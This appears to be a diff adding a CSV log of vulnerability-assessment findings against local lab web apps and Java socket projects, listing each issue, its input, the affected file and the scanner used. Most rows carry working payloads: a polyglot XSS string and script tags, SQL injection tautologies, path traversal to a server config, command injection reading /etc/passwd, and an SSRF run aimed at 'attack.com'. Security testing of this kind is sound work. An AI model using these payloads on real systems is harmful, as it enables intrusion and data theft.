@@ -1,0 +1,36 @@
+i2,XSS (DOM),"username: jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e",vuln_wa/XSS/XSS_level1.php,OWASP ZAP
+i2,XSS (Reflected),username: <scrIpt>alert(1);</scRipt>,vuln_wa/XSS/XSS_level1.php,OWASP ZAP
+i2,XSS (Reflected),username: <img src=x onerror=prompt()>,vuln_wa/XSS/XSS_level3.php,OWASP ZAP
+i2,Path Transversal,https://localhost/vuln_wa/FileInclusion/pages/lvl1.php?file=/opt/lampp/etc/extra/httpd-xampp.conf,vuln_wa/FileInclusion/pages/lvl1.php,OWASP ZAP
+i2,Path Transversal,https://localhost/vuln_wa/FileInclusion/pages/lvl2.php?file=/opt/lampp/etc/extra/httpd-xampp.conf,vuln_wa/FileInclusion/pages/lvl2.php,OWASP ZAP
+i2,SQL Injection,firstname: 1' OR '1'='1,vuln_wa/SQL/sql1.php,SQLMAP
+i2,SQL Injection,"number: """" or 1=1; --",vuln_wa/SQL/sql2.php,SQLMAP
+i2,SQL Injection,number: ' OR '1'='1,vuln_wa/SQL/sql3.php,SQLMAP
+i2,SQL Injection,number: 23 or 1=1; --,vuln_wa/SQL/sql4.php,SQLMAP
+i2,SQL Injection,number: ' OR '1'='1' -- ,vuln_wa/SQL/sql6.php,OWASP ZAP
+i2,Remote Comand Execution,typeBox(Username): cat comex1/log1.txt,vuln_wa/CommandExecution/CommandExec-1.php,OWASP ZAP
+i2,Remote Comand Execution,typeBox(Name): ls,vuln_wa/CommandExecution/CommandExec-3.php,OWASP ZAP
+i2,Remote Comand Execution,typeBox(Name): cat /etc/passwd,vuln_wa/CommandExecution/CommandExec-4.php,OWASP ZAP
+pt2,Dados sensiveis (user:pass) expostos,,kjf14\MODC\MODC\users.txt,Static Analysis
+pt2,Dados sensiveis (user:pass) expostos,,kjf14\MODC\MODC\server\users.txt,Static Analysis
+pt2,Information Exposure Through na Error Message,,kjf14\MODC\MODC\client\Client.java,Horusec
+pt2,Information Exposure Through na Error Message,,kjf14\MODC\MODC\server\ServerThread.java,Horusec
+pt2,Information Exposure Through na Error Message,,kjf14\MODC\MODC\objects\Message.java,Horusec
+pt2,Insecure use of Socket,,kjf14\MODC\MODC\client\Client.java,HCL Appscan CodeSweep
+pt2,Insecure use of Socket,,kjf14\MODC\MODC\client\Server.java,HCL Appscan CodeSweep
+pt2,ObjectInputStream deserialization injection is possible,,kjf14\MODC\MODC\client\Client.java,HCL Appscan CodeSweep
+pt2,Print stack trace is detected in Java code,,kjf14\MODC\MODC\client\Client.java,HCL Appscan CodeSweep
+pt2,Print stack trace is detected in Java code,,kjf14\MODC\MODC\client\Server.java,HCL Appscan CodeSweep
+pt2,Resource injection in the use of Socket/SSLSocket,,kjf14\MODC\MODC\client\Client.java,HCL Appscan CodeSweep
+pt2,Resource injection in the use of Socket/SSLSocket,,kjf14\MODC\MODC\client\Server.java,HCL Appscan CodeSweep
+pt1,SQL Injection,1234 ' OR '1' = '1,mavenproject\src\main\java\grupoSecreto\mavenproject\TintolmarketServer.java,Horusec/Static Analysis
+pt1,TCP Server Socket,,mavenproject\src\main\java\grupoSecreto\mavenproject\TintolmarketServer.java,Horusec
+pt1,Deserialization of untrusted Data CWE-502,,mavenproject\src\main\java\grupoSecreto\mavenproject\Tintolmarket.java,Snyk
+pt1,Cleartext Transmission of Sensitive Information CWE-319,,mavenproject\src\main\java\grupoSecreto\mavenproject\Tintolmarket.java,Snyk
+pt1,Server-Side Request Forgery (SSRF) CWE-918,"mvn exec:java ""-Dexec.mainClass=grupoSecreto.mavenproject.Tintolmarket"" ""-Dexec.args=attack.com:8700""",mavenproject\src\main\java\grupoSecreto\mavenproject\Tintolmarket.java,Snyk
+pt1,Deserialization of untrusted Data CWE-502,,mavenproject\src\main\java\grupoSecreto\mavenproject\TintolmarketServer.java,Snyk
+pt1,SQL injection CWE-89,1234 ' OR '1' = '1,mavenproject\src\main\java\grupoSecreto\mavenproject\TintolmarketServer.java,Snyk
+pt1,Missing close socket,,mavenproject\src\main\java\grupoSecreto\mavenproject\TintolmarketServer.java,Snyk
+pt1,Print stack trace is detected,,mavenproject\src\main\java\grupoSecreto\mavenproject\TintolmarketServer.java,HCL Appscan CodeSweep
+pt1,Password store in java string object,,mavenproject\src\main\java\grupoSecreto\mavenproject\TintolmarketServer.java,HCL Appscan CodeSweep
+pt1,Resource injection in the socket ,,mavenproject\src\main\java\grupoSecreto\mavenproject\TintolmarketServer.java,HCL Appscan CodeSweep
